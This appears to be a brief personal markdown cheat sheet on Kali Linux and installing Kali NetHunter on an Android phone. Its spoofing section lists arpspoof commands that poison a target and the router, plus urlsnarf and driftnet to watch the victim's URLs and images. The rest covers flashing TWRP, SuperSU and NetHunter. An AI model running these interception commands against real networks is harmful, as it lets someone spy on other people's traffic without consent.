# Kali and Nethunter

## Kali

### Spoofing

- ARP spoofing


            # poison the client
            arpspoof -i {interface} -t {target} {router}
            # poison the router
            arpspoof -i {interface} -t {router} {target}
            
            # watch the urls flow through the router
            urlsnarf -i {interface}

            # watch the flowing images
            driftnet -i {interface}

## Nethunter

### Installation

- Preparation

    - Stock Image: [CyanogenMod](https://download.cyanogenmod.org/)
    - SuperSu Image: [SuperSU](https://download.chainfire.eu/969/SuperSU)
    - TeamWin Recovery Project Image: [TWRP](https://twrp.me/)
    - Kali Nethunter Image:

        > 0. [download pre-built images](https://www.offensive-security.com/kali-linux-nethunter-download/), or:
        > 1. checkout Nethunter from [Github](https://github.com/offensive-security/kali-nethunter)
        > 2. build Nethunter for your device: [tutorial](https://github.com/offensive-security/kali-nethunter/wiki/Building-Nethunter)

    - Optional

        - [Nethunter kernels](https://idlekernel.com/nethunter/nightly/)
        - [Xposed](http://dl-xda.xposed.info/framework/), [on XDA-Forum](http://forum.xda-developers.com/showthread.php?t=3034811)
        - Wireless Card Selection: [Nethunter](https://github.com/offensive-security/kali-nethunter/wiki/Wireless-Cards)

- Install (~1 hour)

    1. Flash Stock Image via fastboot, configure and reboot
    2. Flash TWRP via fastboot
    3. Flash SuperSu via TWRP
    4. Flash Nethunter via TWRP

    Or take advantage of the [scripts](https://github.com/offensive-security/nethunter-LRT).
    
### Features

- [Introduction](https://github.com/offensive-security/kali-nethunter/wiki#60-kali-nethunter-attacks-and-features)
